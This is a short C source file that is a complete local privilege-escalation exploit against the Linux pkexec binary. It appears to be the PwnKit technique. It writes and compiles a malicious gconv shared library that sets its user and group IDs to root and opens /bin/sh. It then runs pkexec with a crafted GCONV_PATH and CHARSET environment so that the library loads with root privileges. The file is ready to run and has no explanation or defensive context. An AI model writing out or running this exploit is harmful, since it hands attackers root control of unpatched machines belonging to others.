#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void gconv() {}\n"
    "void gconv_init() {\n"
    "	setuid(0); setgid(0);\n"
    "	seteuid(0); setegid(0);\n"
    "	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'apple'; /bin/sh\");\n"
    "	exit(0);\n"
    "}";

int main(int argc, char *argv[])
{
    FILE *fp;
    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./apple'; chmod a+x 'GCONV_PATH=./apple'");
    system("mkdir -p apple; echo 'module UTF-8// apple// apple 2' > apple/gconv-modules");
    fp = fopen("apple/apple.c", "w");
    fprintf(fp, "%s", shell);
    fclose(fp);
    system("gcc apple/apple.c -o apple/apple.so -shared -fPIC");
    char *env[] = {"apple", "PATH=GCONV_PATH=.", "CHARSET=apple", "SHELL=apple", NULL};
    execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}